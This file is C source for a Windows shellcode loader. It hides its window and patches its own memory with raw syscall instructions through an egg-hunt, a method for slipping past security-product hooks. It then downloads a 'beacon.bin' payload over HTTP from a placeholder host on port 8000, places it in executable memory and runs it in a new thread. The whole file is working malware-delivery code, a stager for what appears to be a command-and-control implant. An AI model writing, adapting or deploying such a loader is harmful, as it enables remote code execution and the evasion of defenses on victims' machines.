#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <psapi.h>
#include "syscalls64.h"

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
{
    char *d = (char *)(dest);
    char *s = (char *)(src);
    if (d < s)
        while (len--)
            *d++ = *s++;
    else
    {
        char *lasts = s + (len - 1);
        char *lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}

void FindAndReplace(unsigned char egg[], unsigned char replace[])
{
    HANDLE hProcess = GetCurrentProcess();
    HMODULE lphModule;
    DWORD lpcbNeeded;
    MODULEINFO mi;
    ULONG64 startAddress, size, currentOffset = 0;
    unsigned char buffer[8];

    EnumProcessModules(hProcess, &lphModule, sizeof(lphModule), &lpcbNeeded);
    GetModuleInformation(hProcess, lphModule, &mi, sizeof(mi));

    startAddress = (ULONG64)mi.lpBaseOfDll;
    size = (ULONG64)mi.SizeOfImage;

    while (currentOffset < size - 8)
    {
        LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);
        ReadProcessMemory(hProcess, currentAddress, buffer, 8, NULL);
        if (memcmp(egg, buffer, 8) == 0)
        {
            WriteProcessMemory(hProcess, currentAddress, replace, 8, NULL);
        }
        currentOffset++;
    }
}

int main()
{
    ShowWindow(GetForegroundWindow(), SW_HIDE);
    unsigned char egg[] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77};
    unsigned char replace[] = {0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC};
    FindAndReplace(egg, replace);

    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL,
              hConnect = NULL,
              hRequest = NULL;

    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
        hConnect = WinHttpConnect(hSession, L"x.x.x.x",
                                  8000, 0);

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"beacon.bin",
                                      NULL, WINHTTP_NO_REFERER,
                                      WINHTTP_DEFAULT_ACCEPT_TYPES,
                                      0);

    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
                                      WINHTTP_NO_ADDITIONAL_HEADERS,
                                      0, WINHTTP_NO_REQUEST_DATA, 0,
                                      0, 0);

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    PVOID lpAddress = NULL;
    SIZE_T sDataSize = 0x60000;
    NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD_PTR hptr = (DWORD_PTR)lpAddress;

    if (bResults)
        do
        {
            dwSize = 0;
            WinHttpQueryDataAvailable(hRequest, &dwSize);
            pszOutBuffer = (unsigned char *)calloc(dwSize + 1, sizeof(unsigned char));
            ZeroMemory(pszOutBuffer, dwSize + 1);
            WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
            VxMoveMemory((PVOID)hptr, pszOutBuffer, dwSize);
            hptr += dwSize;
            free(pszOutBuffer);
        } while (dwSize > 0);

    ULONG ulOldProtect = 0;
    NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    NtWaitForMultipleObjects(1, &hHostThread, WaitAll, FALSE, NULL);

    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession)
        WinHttpCloseHandle(hSession);
    return 0;
}
